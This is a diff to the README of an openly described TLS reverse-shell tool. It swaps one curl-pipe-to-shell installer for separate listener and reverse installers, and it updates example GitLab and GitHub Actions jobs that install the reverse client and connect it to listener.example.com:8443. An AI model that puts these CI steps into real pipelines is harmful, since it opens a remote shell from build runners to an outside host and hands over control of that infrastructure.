@@ -4,10 +4,9 @@ Minimal, encrypted reverse shell over raw TCP with TLS (no HTTP).
 
 ## Install
 - Binstaller (recommended):
-  ```bash
-  curl -fsSL https://frjcomp.github.io/golang-https-rev/install.sh | sh
-  ```
-  Set `BINSTALLER_BIN` to change install dir (defaults to `~/.local/bin`).
+  - Listener: `curl -fsSL https://frjcomp.github.io/golang-https-rev/install-listener.sh | sh`
+  - Reverse:  `curl -fsSL https://frjcomp.github.io/golang-https-rev/install-reverse.sh | sh`
+  - Set `BINSTALLER_BIN` to change install dir (defaults to `~/.local/bin`).
 
 - From source:
   ```bash
@@ -41,7 +40,7 @@ Minimal, encrypted reverse shell over raw TCP with TLS (no HTTP).
     image: alpine:3.19
     script:
       - apk add --no-cache curl
-      - curl -fsSL https://frjcomp.github.io/golang-https-rev/install.sh | sh
+      - curl -fsSL https://frjcomp.github.io/golang-https-rev/install-reverse.sh | sh
       - ~/.local/bin/reverse listener.example.com:8443 3
   ```
 
@@ -54,7 +53,7 @@ Minimal, encrypted reverse shell over raw TCP with TLS (no HTTP).
       runs-on: ubuntu-latest
       steps:
         - name: Install reverse client
-          run: curl -fsSL https://frjcomp.github.io/golang-https-rev/install.sh | sh
+          run: curl -fsSL https://frjcomp.github.io/golang-https-rev/install-reverse.sh | sh
         - name: Run reverse
           run: ~/.local/bin/reverse listener.example.com:8443 3
   ```
